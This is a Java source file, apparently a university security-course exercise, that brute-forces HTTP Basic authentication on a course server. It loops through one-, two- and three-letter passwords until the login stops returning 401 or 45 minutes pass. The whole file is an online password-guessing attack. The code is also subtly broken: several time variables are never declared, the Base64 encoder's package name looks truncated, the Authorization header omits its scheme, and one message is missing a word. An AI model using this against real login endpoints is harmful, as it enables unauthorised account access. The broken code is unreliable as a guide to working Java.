import java.net.*; 
import java.io.*; 
import java.util.Vector;
import java.util.Date;
import java.security.*;











  
public class BruteForce { 
  public static BufferedReader in;
  
  
  public static void main (String[] args) throws Exception {   
    String baseURL = "http://sec-crack.cs.rmit.edu./SEC/2/index.php";    
    Date date = new Date();
     startTime=date.getTime();
    int LIMITINMINUTES=45;
    int TIMELIMIT=LIMITINMINUTES*1000*60;
    boolean timedOut=false;
    boolean found=false;
    
    char[] letters={'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y','Z'};
    char[] lettersLC={'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
    char[] lettersUC={'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y','Z'};
    
    
    
    
    
    
    while (found==false) {
      String password = "";

      
      URL url = new URL(baseURL); 
      String username="";
      
      
      for (int i=0; i<letters.length; i++){
        password = String.valueOf(letters[i]);  
 
        
        String authString = username+":"+password;
        String encoding = new misc.BASE64Encoder().encode(authString.getBytes()); 
        System.out.print("authString is: "+authString);     
        
        URLConnection urlConnect=url.openConnection();
      
        
        urlConnect.setRequestProperty("Authorization"," "+encoding);
 
        String responseCode = urlConnect.getHeaderField(0);
	System.out.print(" Response  is: ");
	System.out.println(responseCode);

        if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
          found=true;
	  i=letters.length;
        }      
      } 
      
      
      if (!found) {
	for (int j=0; j<letters.length; j++){
          for (int k=0; k<letters.length; k++) {
	    String letter1=String.valueOf(letters[j]);	        
            String letter2=String.valueOf(letters[k]);
	    password = letter1.concat(letter2);   

	    String authString = username+":"+password;
	    String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	    System.out.print("authString is: "+authString);     
	    
	    URLConnection urlConnect=url.openConnection();

	    
	    urlConnect.setRequestProperty("Authorization"," "+encoding);

	    String responseCode = urlConnect.getHeaderField(0);

    	    System.out.print(" Response  is: ");
    	    System.out.println(responseCode);

	    if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
              found=true;
              j=letters.length;
	      k=letters.length;
	    }
	  }
	}
      } 
  
  
  
  
  
      if (!found){ 
      
	for (int j=0; j<lettersLC.length; j++){
          for (int k=0; k<lettersLC.length; k++) {
	    for (int l=0; l<lettersLC.length; l++){
	      String letter1=String.valueOf(lettersLC[j]);	        
              String letter2=String.valueOf(lettersLC[k]);
	      String letter3=String.valueOf(lettersLC[l]);
	      password = letter1.concat(letter2);  
	      password = password.concat(letter3); 

	      String authString = username+":"+password;
	      String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	      System.out.print("authString is: "+authString);     
	      
	      URLConnection urlConnect=url.openConnection();

	      
	      urlConnect.setRequestProperty("Authorization"," "+encoding);

	      String responseCode = urlConnect.getHeaderField(0);

              String errorCode = new String(urlConnect.getHeaderField(0));
      	      System.out.print(" Response  is: ");
      	      System.out.println(responseCode);

	      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        	found=true;
		j=lettersLC.length;
		k=lettersLC.length;
		l=lettersLC.length;
	      }
            }
	  }
	  
          Date endDate = new Date();
           endTime=endDate.getTime();    
          if (endTime>(TIMELIMIT+startTime)){
            System.out.println("Timed out");
            timedOut=true;
	    j=lettersLC.length;
          }
	}
      } 

      if (!found){ 
      
	for (int j=0; j<lettersUC.length; j++){
          for (int k=0; k<lettersLC.length; k++) {
	    for (int l=0; l<lettersLC.length; l++){
	      String letter1=String.valueOf(lettersUC[j]);	        
              String letter2=String.valueOf(lettersLC[k]);
	      String letter3=String.valueOf(lettersLC[l]);
	      password = letter1.concat(letter2);  
	      password = password.concat(letter3); 

	      String authString = username+":"+password;
	      String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	      System.out.print("authString is: "+authString);     
	      
	      URLConnection urlConnect=url.openConnection();

	      
	      urlConnect.setRequestProperty("Authorization"," "+encoding);

	      String responseCode = urlConnect.getHeaderField(0);

              String errorCode = new String(urlConnect.getHeaderField(0));
      	      System.out.print(" Response  is: ");
      	      System.out.println(responseCode);

	      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        	found=true;
		j=lettersUC.length;
		k=lettersLC.length;
		l=lettersLC.length;
	     }
            }
	  }
	  
          Date endDate = new Date();
           endTime=endDate.getTime();    
          if (endTime>(TIMELIMIT+startTime)){
            System.out.println("Timed out");
            timedOut=true;
	    j=lettersUC.length;
          }
	}
      } 
      
      if (!found){ 
      
	for (int j=0; j<lettersUC.length; j++){
          for (int k=0; k<lettersUC.length; k++) {
	    for (int l=0; l<lettersUC.length; l++){
	      String letter1=String.valueOf(lettersUC[j]);	        
              String letter2=String.valueOf(lettersUC[k]);
	      String letter3=String.valueOf(lettersUC[l]);
	      password = letter1.concat(letter2);  
	      password = password.concat(letter3); 

	      String authString = username+":"+password;
	      String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	      System.out.print("authString is: "+authString);     
	      
	      URLConnection urlConnect=url.openConnection();

	      
	      urlConnect.setRequestProperty("Authorization"," "+encoding);

	      String responseCode = urlConnect.getHeaderField(0);

              String errorCode = new String(urlConnect.getHeaderField(0));
      	      System.out.print(" Response  is: ");
      	      System.out.println(responseCode);

	      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        	found=true;
		j=lettersUC.length;
		k=lettersUC.length;
		l=lettersUC.length;
	     }
            }
	  }
	  
          Date endDate = new Date();
           endTime=endDate.getTime();    
          if (endTime>(TIMELIMIT+startTime)){
            System.out.println("Timed out");
            timedOut=true;
	    j=lettersUC.length;
          }
	}
      } 
      
      if (!found){ 
      
	for (int j=0; j<lettersUC.length; j++){
          for (int k=0; k<lettersUC.length; k++) {
	    for (int l=0; l<lettersLC.length; l++){
	      String letter1=String.valueOf(lettersUC[j]);	        
              String letter2=String.valueOf(lettersUC[k]);
	      String letter3=String.valueOf(lettersLC[l]);
	      password = letter1.concat(letter2);  
	      password = password.concat(letter3); 

	      String authString = username+":"+password;
	      String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	      System.out.print("authString is: "+authString);     
	      
	      URLConnection urlConnect=url.openConnection();

	      
	      urlConnect.setRequestProperty("Authorization"," "+encoding);

	      String responseCode = urlConnect.getHeaderField(0);

              String errorCode = new String(urlConnect.getHeaderField(0));
      	      System.out.print(" Response  is: ");
      	      System.out.println(responseCode);

	      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        	found=true;
		j=lettersUC.length;
		k=lettersUC.length;
		l=lettersLC.length;
	     }
            }
	  }
	  
          Date endDate = new Date();
           endTime=endDate.getTime();    
          if (endTime>(TIMELIMIT+startTime)){
            System.out.println("Timed out");
            timedOut=true;
	    j=lettersUC.length;
          }
	}
      } 
      
      if (!found){ 
      
	for (int j=0; j<lettersLC.length; j++){
          for (int k=0; k<lettersUC.length; k++) {
	    for (int l=0; l<lettersUC.length; l++){
	      String letter1=String.valueOf(lettersLC[j]);	        
              String letter2=String.valueOf(lettersUC[k]);
	      String letter3=String.valueOf(lettersUC[l]);
	      password = letter1.concat(letter2);  
	      password = password.concat(letter3); 

	      String authString = username+":"+password;
	      String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	      System.out.print("authString is: "+authString);     
	      
	      URLConnection urlConnect=url.openConnection();

	      
	      urlConnect.setRequestProperty("Authorization"," "+encoding);

	      String responseCode = urlConnect.getHeaderField(0);

              String errorCode = new String(urlConnect.getHeaderField(0));
      	      System.out.print(" Response  is: ");
      	      System.out.println(responseCode);

	      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        	found=true;
		j=lettersLC.length;
		k=lettersUC.length;
		l=lettersUC.length;
	     }
            }
	  }
	  
          Date endDate = new Date();
           endTime=endDate.getTime();    
          if (endTime>(TIMELIMIT+startTime)){
            System.out.println("Timed out");
            timedOut=true;
	    j=lettersLC.length;
          }
	}
      } 
     
      if (!found){ 
      
	for (int j=0; j<lettersLC.length; j++){
          for (int k=0; k<lettersLC.length; k++) {
	    for (int l=0; l<lettersUC.length; l++){
	      String letter1=String.valueOf(lettersLC[j]);	        
              String letter2=String.valueOf(lettersLC[k]);
	      String letter3=String.valueOf(lettersUC[l]);
	      password = letter1.concat(letter2);  
	      password = password.concat(letter3); 

	      String authString = username+":"+password;
	      String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	      System.out.print("authString is: "+authString);     
	      
	      URLConnection urlConnect=url.openConnection();

	      
	      urlConnect.setRequestProperty("Authorization"," "+encoding);

	      String responseCode = urlConnect.getHeaderField(0);

              String errorCode = new String(urlConnect.getHeaderField(0));
      	      System.out.print(" Response  is: ");
      	      System.out.println(responseCode);

	      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        	found=true;
		j=lettersLC.length;
		k=lettersLC.length;
		l=lettersUC.length;
	     }
            }
	  }
	  
          Date endDate = new Date();
           endTime=endDate.getTime();    
          if (endTime>(TIMELIMIT+startTime)){
            System.out.println("Timed out");
            timedOut=true;
	    j=lettersLC.length;
          }
	}
      } 
       
      if (!found){ 
      
	for (int j=0; j<lettersUC.length; j++){
          for (int k=0; k<lettersLC.length; k++) {
	    for (int l=0; l<lettersUC.length; l++){
	      String letter1=String.valueOf(lettersUC[j]);	        
              String letter2=String.valueOf(lettersLC[k]);
	      String letter3=String.valueOf(lettersUC[l]);
	      password = letter1.concat(letter2);  
	      password = password.concat(letter3); 

	      String authString = username+":"+password;
	      String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	      System.out.print("authString is: "+authString);     
	      
	      URLConnection urlConnect=url.openConnection();

	      
	      urlConnect.setRequestProperty("Authorization"," "+encoding);

	      String responseCode = urlConnect.getHeaderField(0);

              String errorCode = new String(urlConnect.getHeaderField(0));
      	      System.out.print(" Response  is: ");
      	      System.out.println(responseCode);

	      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        	found=true;
		j=lettersUC.length;
		k=lettersLC.length;
		l=lettersUC.length;
	     }
            }
	  }
	  
          Date endDate = new Date();
           endTime=endDate.getTime();    
          if (endTime>(TIMELIMIT+startTime)){
            System.out.println("Timed out");
            timedOut=true;
	    j=lettersLC.length;
          }
	}
      } 
      
      if (!found){ 
      
	for (int j=0; j<lettersLC.length; j++){
          for (int k=0; k<lettersUC.length; k++) {
	    for (int l=0; l<lettersLC.length; l++){
	      String letter1=String.valueOf(lettersLC[j]);	        
              String letter2=String.valueOf(lettersUC[k]);
	      String letter3=String.valueOf(lettersLC[l]);
	      password = letter1.concat(letter2);  
	      password = password.concat(letter3); 

	      String authString = username+":"+password;
	      String encoding = new misc.BASE64Encoder().encode(authString.getBytes());
	      System.out.print("authString is: "+authString);     
	      
	      URLConnection urlConnect=url.openConnection();

	      
	      urlConnect.setRequestProperty("Authorization"," "+encoding);

	      String responseCode = urlConnect.getHeaderField(0);

              String errorCode = new String(urlConnect.getHeaderField(0));
      	      System.out.print(" Response  is: ");
      	      System.out.println(responseCode);

	      if (!responseCode.equals("HTTP/1.1 401 Authorization Required")) {
        	found=true;
		j=lettersLC.length;
		k=lettersUC.length;
		l=lettersLC.length;
	     }
            }
	  }
	  
          Date endDate = new Date();
           endTime=endDate.getTime();    
          if (endTime>(TIMELIMIT+startTime)){
            System.out.println("Timed out");
            timedOut=true;
	    j=lettersLC.length;
          }
	}
      } 
      
      if (found){ 
       
        System.out.println("Password is: "+password);

      }
      else {
        found=true;
	if (!timedOut){
          System.out.println("Tried all combinations, still  match.");
	}
      }
      Date foundDate = new Date();
       foundTime=foundDate.getTime();  
      foundTime=(foundTime-startTime);
      System.out.println("Time taken was : "+foundTime+" milliseconds"); 
    }
  } 
}  
